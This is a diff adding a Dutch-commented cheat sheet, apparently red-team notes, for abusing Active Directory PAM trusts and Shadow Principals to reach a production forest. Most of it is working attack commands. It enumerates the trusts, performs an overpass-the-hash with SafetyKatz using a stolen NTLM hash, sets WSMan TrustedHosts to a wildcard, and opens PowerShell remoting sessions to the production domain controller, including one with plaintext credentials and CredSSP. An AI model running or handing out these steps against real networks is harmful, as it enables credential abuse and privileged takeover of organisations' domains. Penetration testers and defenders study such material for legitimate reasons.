@@ -1,0 +1,48 @@
+# PAM Trust — Privileged Access Management Trust abuse
+# Misbruik PAM trusts en Shadow Principals om toegang te krijgen tot een ander forest
+
+# === Wat is een PAM Trust? ===
+# Een PAM trust is een forest trust met ForestTransitive=True en SIDFilteringQuarantined=False
+# Shadow Principals in het bastion forest mappen naar SIDs in het productie forest
+# Leden van Shadow Principals krijgen tijdelijke elevated rechten in het productie forest
+
+# === Enumeratie ===
+
+# Detecteer PAM trust (vanuit productie forest)
+Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
+
+# Detecteer PAM trust (vanuit bastion forest)
+Get-ADTrust -Filter * -Server BASTION_DOMAIN
+# Kijk naar: TrustAttributes = 1096 (TREAT_AS_EXTERNAL + FOREST_TRANSITIVE + PIM_TRUST)
+
+# === Shadow Principals enumeratie (op bastion forest) ===
+
+# Lees Shadow Principal Configuration
+Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl
+
+# De msDS-ShadowPrincipalSid bevat de SID van de productie-principal (bijv. Domain Admins)
+# De member bevat wie in het bastion forest deze rechten krijgt
+
+# === Exploit ===
+
+# Stap 1: Compromise een member van een Shadow Principal in het bastion forest
+# (via DCSync, credential extraction, etc.)
+
+# Stap 2: Overpass-the-Hash met de NTLM hash
+SafetyKatz.exe "sekurlsa::evasive-pth /user:administrator /domain:BASTION_DOMAIN /ntlm:HASH /run:powershell.exe" "exit"
+
+# Stap 3: Configureer TrustedHosts voor NTLM authenticatie
+Set-Item WSMan:\localhost\Client\TrustedHosts * -Force
+
+# Stap 4: Verbind met het productie forest
+Enter-PSSession PRODUCTION_DC_IP -Authentication NegotiateWithImplicitCredential
+
+# === Alternatief: PSRemoting met expliciete credentials ===
+$passwd = ConvertTo-SecureString 'PASS' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential ("BASTION_DOMAIN\administrator", $passwd)
+New-PSSession -cn PRODUCTION_DC -Credential $creds -Authentication Credssp
+
+# Noot: PAM trusts maken SID history mogelijk over forest grenzen heen
+# Noot: Shadow Principals verlopen standaard na een ingestelde TTL
+# Noot: NTLM authenticatie vereist (Kerberos werkt niet altijd over PAM trusts)
+# Noot: CredSSP kan nodig zijn als de sessie verder moet authenticeren (double hop)
